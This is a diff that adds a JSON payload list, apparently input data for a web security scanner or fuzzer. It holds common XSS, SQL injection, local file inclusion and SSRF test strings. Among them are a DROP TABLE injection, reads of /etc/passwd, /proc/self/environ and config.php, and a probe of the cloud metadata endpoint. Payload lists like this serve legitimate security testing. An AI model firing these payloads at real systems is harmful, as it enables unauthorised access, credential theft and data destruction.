@@ -1,0 +1,28 @@
+{
+    "xss": [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "javascript:alert(1)",
+        "\"><script>alert(1)</script>",
+        "'-alert(1)-'"
+    ],
+    "sqli": [
+        "' OR '1'='1",
+        "admin' --",
+        "' UNION SELECT NULL,NULL,NULL--",
+        "1; DROP TABLE users--",
+        "extractvalue(1,concat(0x7e,(select user()),0x7e))"
+    ],
+    "lfi": [
+        "../../../../etc/passwd",
+        "/proc/self/environ",
+        "php://filter/convert.base64-encode/resource=config.php",
+        "/var/log/apache2/access.log"
+    ],
+    "ssrf": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://localhost:80",
+        "http://0.0.0.0:22",
+        "file:///etc/passwd"
+    ]
+}
